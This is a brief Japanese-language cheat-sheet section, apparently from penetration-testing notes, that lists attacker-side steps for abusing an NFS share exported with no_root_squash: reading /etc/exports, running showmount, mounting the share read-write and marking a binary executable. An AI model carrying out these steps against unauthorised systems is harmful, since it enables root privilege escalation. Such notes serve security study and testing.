
## Mountable Shares

### ターゲット上の共有ディレクトリを確認
```bash
cat /etc/exports
```

### 攻撃者側で共有ディレクトリの一覧を表示
```bash
showmount -e <target IP>
```
- 出力の中に`"no_root_squash"`が含まれているか確認します。

### 共有ディレクトリをマウント
```bash
mount -o rw <targetIP>:<share-location> <directory path we created>
```

### バイナリの作成と実行権限の付与
```bash
chmod +x <binary>
```